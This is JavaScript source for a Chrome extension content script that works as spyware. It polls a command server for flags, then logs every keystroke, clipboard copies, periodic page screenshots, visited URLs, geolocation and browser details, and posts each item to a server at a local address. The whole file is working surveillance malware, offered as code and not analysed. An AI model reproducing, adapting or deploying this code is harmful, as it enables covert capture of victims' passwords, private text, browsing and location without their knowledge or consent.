host_port = "http://127.0.0.1:3000";

var screenshot_flag = true
var geolocation_flag = true
var keylog_flag = true
var urls_flag = true


var port = chrome.runtime.connect({
    name: "mycontentscript"
});

port.onMessage.addListener(function(message, sender) {
    get_flags()
    listenForCommands()

    url = message.url;

    if (!url.includes("youtube.com")) {
        takeScreenshot();
    }
    
    //Eliminates set flag race condition
    var terminate = setInterval(function() {
        getUrls()
        getGeo()
        getOSInfo()   
        clearInterval(terminate);
    
    }, 1000);
    
});

/*
	Get any commands the server wants to send to the 
	extenstion, sets the flags accordingly, and prints
	to the console.
*/
function listenForCommands() {
    setInterval(function() {
        try {
            get_flags()
        } catch (err) {}
    }, 1000);
}


function get_flags() {
    cmd_log = '{"logtype": "CMD"}'
    $.post(host_port, cmd_log, function(data, status) {
        if (!(data === "")) {
            flags = JSON.parse(data)
            set_flags(flags)

            console_cmd = flags.cmd
            if (!(console_cmd === "")) {
                console.log(console_cmd)
            }
        }
    })
}


/*
	Sets screenshot, geolocation, keylog,
	and url flags
*/
function set_flags(flags) {
    if (flags.screenshots == "true") {
        screenshot_flag = true
    } else {
        screenshot_flag = false
    }

    if (flags.geolocation == "true") {
        geolocation_flag = true
    } else {
        geolocation_flag = false
    }

    if (flags.keylog == "true") {
        keylog_flag = true
    } else {
        keylog_flag = false
    }

    if (flags.urls == "true") {
        urls_flag = true
    } else {
        urls_flag = false
    }
}


//Logs all URLs visited
function getUrls() {
    if (!urls_flag) {
        return
    }

    today = new Date();
    var url = new URL(window.location.href).toString();
    url_log = '{"logtype": "URL", "datetime":"' + today + '", "url":"' + url + '"}'
    if (urls_flag) {
        $.post(host_port, url_log, function(data, status) {
            //console.log(data,status)
        })
    }
}


//Logs all keystrokes pressed
document.onkeypress = function(e) {
    if (keylog_flag) {
        today = new Date();
        key_log = '{"logtype": "KEY", "datetime":"' + today + '", "key":"' + e.key + '"}'
        $.post(host_port, key_log, function(data, status) {
            //console.log(data,status)
        })
    }
}


//Logs anything coppied to the clipboard
//Citation: https://developer.mozilla.org/en-US/docs/Web/API/Clipboard/readText
//		    https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then
//			https://stackoverflow.com/questions/23223718/failed-to-execute-btoa-on-window-the-string-to-be-encoded-contains-characte
document.addEventListener("copy", getClipboardData);
let previousClipboard = ""

function getClipboardData() {
    clip = window.navigator.clipboard.readText();
    clip.then((value) => {
        if (previousClipboard != value) {
            previousClipboard = value
            try {
                base64encoded = btoa(unescape(encodeURIComponent(value)))
                clip_log = '{"logtype": "CLIP", "datetime":"' + today + '", "clip":"' + base64encoded + '"}'
                today = new Date();
                $.post(host_port, clip_log, function(data, status) {
                    //console.log(data,status)
                })
            } catch (err) {
                console.log(err)
            }

        }
    });
}


//Periodically takes a screenshot of the currently used tab
//Citation: https://html2canvas.hertzen.com/
//			https://developer.mozilla.org/en-US/docs/Web/API/HTMLCanvasElement/toDataURL
function takeScreenshot() {
    setInterval(function() {
        try {
            if (screenshot_flag) {
                html2canvas(document.body).then(function(canvas) {

                    today = new Date()
                    //Convert canvas to base64 data with toDataURL
                    image_log = '{"logtype": "IMG", "datetime":"' + today + '", "img":"' + canvas.toDataURL("img/png") + '"}'

                    $.post(host_port, image_log, function(data, status) {
                        //console.log(data,status)
                    })
                });
            }
        } catch (err) {}
    }, 5000);
}


//Logs the geolocation data
//Citation: https://developer.mozilla.org/en-US/docs/Web/API/Geolocation/getCurrentPosition
function getGeo() {
    if (geolocation_flag) {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (location) => {
                    today = new Date()
                    location_log = '{"logtype": "LOC", "datetime":"' + today + '", "lat":"' + location.coords.latitude + '", "lng":"' + location.coords.longitude + '"}'
                    $.post(host_port, location_log, function(data, status) {})
                }, () => {}
            );
        }
    }
}


//Logs operating system info
function getOSInfo() {
    var nav_obj = window.navigator
    var appVersion = nav_obj.appVersion
    var language = nav_obj.language
    var platform = nav_obj.platform
    var userAgent = nav_obj.userAgent
    var vendor = nav_obj.vendor

    today = new Date()
    os_info_log = '{"logtype": "OSI", "datetime":"' + today + '", "appVersion":"' + appVersion + '", "language":"' + language + '", "platform":"' + platform + '", "userAgent":"' + userAgent + '", "vendor":"' + vendor + '"}'
    $.post(host_port, os_info_log, function(data, status) {})

}